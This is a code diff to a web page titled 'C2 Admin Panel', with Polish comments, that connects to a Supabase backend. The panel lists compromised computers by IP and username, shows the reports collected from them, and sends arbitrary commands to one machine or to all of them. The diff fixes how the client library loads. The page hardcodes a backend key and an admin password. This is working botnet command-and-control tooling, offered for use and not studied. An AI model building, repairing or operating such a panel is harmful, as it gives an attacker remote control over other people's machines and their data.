@@ -2,7 +2,6 @@
 <html>
 <head>
     <title>C2 Admin Panel</title>
-    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0a0a0a; color: #fff; font-family: monospace; padding: 20px; }
@@ -72,8 +71,16 @@
         const SUPABASE_KEY = "sb_publishable_tzVu8Ml-hUbxjLxdEkJPJg_CX3f609n";
         const ADMIN_PASSWORD = "08319752026";
         
-        let _supabase = null;
+        let supabaseClient = null;
         let currentComputerId = null;
+        
+        // Sprawdź czy supabase jest dostępny
+        function getSupabase() {
+            if (window.supabase) return window.supabase;
+            if (window.supabaseJs) return window.supabaseJs;
+            console.error('Supabase library not loaded!');
+            return null;
+        }
         
         function showTab(tabName) {
             document.getElementById('computersTab').style.display = tabName === 'computers' ? 'block' : 'none';
@@ -88,9 +95,12 @@
         }
         
         async function loadComputers() {
-            if (!_supabase) return;
-            const { data, error } = await _supabase.from('computers').select('*').order('last_seen', {ascending: false});
-            if (error) return;
+            if (!supabaseClient) return;
+            const { data, error } = await supabaseClient.from('computers').select('*').order('last_seen', {ascending: false});
+            if (error) {
+                console.error('Load computers error:', error);
+                return;
+            }
             const container = document.getElementById('computersList');
             container.innerHTML = '';
             if (!data || data.length === 0) {
@@ -114,7 +124,7 @@
             currentComputerId = computer.id;
             const modal = document.getElementById('computerModal');
             const content = document.getElementById('modalContent');
-            const { data: reports } = await _supabase.from('reports').select('*').eq('computer_id', computer.id).order('created_at', {ascending: false}).limit(10);
+            const { data: reports } = await supabaseClient.from('reports').select('*').eq('computer_id', computer.id).order('created_at', {ascending: false}).limit(10);
             content.innerHTML = `<h2>${computer.name}</h2>
                 <p>IP: ${computer.ip} | User: ${computer.username}</p>
                 <h3>Recent Reports</h3>
@@ -126,7 +136,7 @@
             document.getElementById('sendCmdBtn').onclick = async () => {
                 const cmd = document.getElementById('cmdInput').value;
                 if (!cmd) return;
-                const { error } = await _supabase.from('commands').insert({ computer_id: currentComputerId, command: cmd, status: 'pending' });
+                const { error } = await supabaseClient.from('commands').insert({ computer_id: currentComputerId, command: cmd, status: 'pending' });
                 document.getElementById('cmdResult').innerHTML = error ? 'Error: ' + error.message : 'Command sent!';
             };
             modal.style.display = 'block';
@@ -135,27 +145,27 @@
         async function sendCommandToAll() {
             const cmd = document.getElementById('commandInput').value;
             if (!cmd) return;
-            const { data: computers } = await _supabase.from('computers').select('id');
+            const { data: computers } = await supabaseClient.from('computers').select('id');
             if (!computers || computers.length === 0) {
                 alert('No computers registered');
                 return;
             }
             for (const comp of computers) {
-                await _supabase.from('commands').insert({ computer_id: comp.id, command: cmd, status: 'pending' });
+                await supabaseClient.from('commands').insert({ computer_id: comp.id, command: cmd, status: 'pending' });
             }
             alert(`Command sent to ${computers.length} computers`);
             loadCommands();
         }
         
         async function loadReports() {
-            if (!_supabase) return;
-            const { data } = await _supabase.from('reports').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
+            if (!supabaseClient) return;
+            const { data } = await supabaseClient.from('reports').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
             document.getElementById('reportsContent').innerHTML = data ? JSON.stringify(data, null, 2) : 'No reports';
         }
         
         async function loadCommands() {
-            if (!_supabase) return;
-            const { data } = await _supabase.from('commands').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
+            if (!supabaseClient) return;
+            const { data } = await supabaseClient.from('commands').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
             document.getElementById('commandResults').innerHTML = data ? JSON.stringify(data, null, 2) : 'No commands';
         }
         
@@ -163,18 +173,36 @@
             document.getElementById('computerModal').style.display = 'none';
         }
         
-        // Inicjalizacja - podpinamy eventy
+        // Inicjalizacja - poczekaj na załadowanie biblioteki
+        function init() {
+            const supabaseLib = getSupabase();
+            if (!supabaseLib) {
+                console.log('Waiting for Supabase library...');
+                setTimeout(init, 500);
+                return;
+            }
+            supabaseClient = supabaseLib.createClient(SUPABASE_URL, SUPABASE_KEY);
+        }
+        
+        // Eventy
         document.getElementById('loginBtn').onclick = async () => {
             const pwd = document.getElementById('passwordInput').value;
             if (pwd === ADMIN_PASSWORD) {
                 document.getElementById('loginSection').style.display = 'none';
                 document.getElementById('mainSection').style.display = 'block';
-                _supabase = window.supabaseJs.createClient(SUPABASE_URL, SUPABASE_KEY);
-                await loadComputers();
-                loadReports();
-                loadCommands();
-                setInterval(loadComputers, 30000);
-                setInterval(loadReports, 60000);
+                if (!supabaseClient) {
+                    const supabaseLib = getSupabase();
+                    if (supabaseLib) supabaseClient = supabaseLib.createClient(SUPABASE_URL, SUPABASE_KEY);
+                }
+                if (supabaseClient) {
+                    await loadComputers();
+                    loadReports();
+                    loadCommands();
+                    setInterval(loadComputers, 30000);
+                    setInterval(loadReports, 60000);
+                } else {
+                    document.getElementById('computersList').innerHTML = '<div style="padding:20px;color:red;">ERROR: Supabase library not loaded. Check internet connection.</div>';
+                }
             } else {
                 alert('Wrong password!');
             }
@@ -186,6 +214,9 @@
         
         document.getElementById('sendAllBtn').onclick = sendCommandToAll;
         document.getElementById('closeModalBtn').onclick = closeModal;
+        
+        // Start
+        init();
     })();
 </script>
 </body>
